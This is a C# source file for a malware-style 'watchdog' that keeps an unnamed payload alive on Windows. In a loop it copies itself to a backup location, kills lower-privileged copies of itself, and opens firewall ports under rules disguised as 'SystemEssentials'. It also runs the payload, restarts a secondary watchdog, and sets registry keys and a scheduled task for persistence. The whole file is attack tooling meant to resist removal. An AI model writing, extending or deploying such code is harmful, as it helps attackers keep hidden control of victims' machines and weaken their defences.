using Microsoft.Win32;
using System.Diagnostics;

class Watchdog
{
    static void Main(string[] args)
    {

        using (Mutex mutex = new Mutex(false, "Global\\" + Config.PrimaryWatchdogMutexName, out bool isNewInstance))
        {
            bool isAdmin = watchdogHelper.IsRunningAsAdministrator(); 

            if (!isNewInstance && isAdmin)
            {

                watchdogHelper.Log("Another instance of the watchdog is already running.");

                int? PID = watchdogHelper.GetProcessIdByName(Process.GetCurrentProcess().ProcessName);

                if (PID.HasValue)
                {
                    string permissionLevel = watchdogHelper.GetProcessPermissionLevel((int)PID);

                    if (permissionLevel != "Administrator") // Possible issue - handle other levels of privledge
                    {
                        watchdogHelper.Log("Killing lower privledged process.");
                        watchdogHelper.KillProcessById((int)PID);
                    }
                    else
                    {
                        Environment.Exit(0);
                    }
                }
                else
                {
                    // handle the case when PID is null
                    watchdogHelper.Log("Failed to get process ID.");
                    Environment.Exit(0);
                }
            } else if (!isNewInstance)
            {
                Environment.Exit(0);
            }

            // Call the main watchdog logic
            if (isNewInstance)
            {
                WatchdogLogic();
            }
            else
            {
                Environment.Exit(0);
            }
        }
    }



        static void WatchdogLogic()
        {
        

        try { 
            if (!File.Exists(Path.Combine(Config.SecondaryWatchdogPath, Config.PrimaryWatchdogName)))
            {
                File.Copy(Config.PrimaryWatchdogFullPath, Path.Combine(Config.SecondaryWatchdogPath, Config.PrimaryWatchdogName), overwrite: false);
            }
        }
        catch (Exception e)
        {
            watchdogHelper.Log($"[ERROR] {e.Message}");
        }

        // Example loop to simulate frequent checks
        while (true)
        {
            watchdogHelper.EnsureDirectoryExists(Config.SecondaryWatchdogPath);
            watchdogHelper.EnsureDirectoryExists(Config.PrimaryWatchdogPath);
            watchdogHelper.EnsureDirectoryExists(Config.PayloadPath);


            foreach(int port in Config.PortsToKeepOpen)
            { 
                string ruleName = "SystemEssentials" + port.ToString();
                watchdogHelper.OpenFirewallPort(port, ruleName);
            }

            watchdogHelper.verifyFilePathsSourceAndDest(Config.PayloadPath, Config.PayloadName);
            watchdogHelper.CheckAndRunPayload(Config.PayloadPath, Config.PayloadName);

            watchdogHelper.verifyFilePathsSourceAndDest(Config.SecondaryWatchdogPath, Config.SecondaryWatchdogName);
            watchdogHelper.CheckAndRunWatchdog(Config.SecondaryWatchdogPath, Config.SecondaryWatchdogName, Config.SecondaryWatchdogMutexName);

            Persistence.runAllTechniques(); // sets and checks the registry keys and scheduled task

            watchdogHelper.Log("Watchdog is ran its loop");
            Thread.Sleep(Config.sleepTime);  // Sleep
        }
     }

}
   

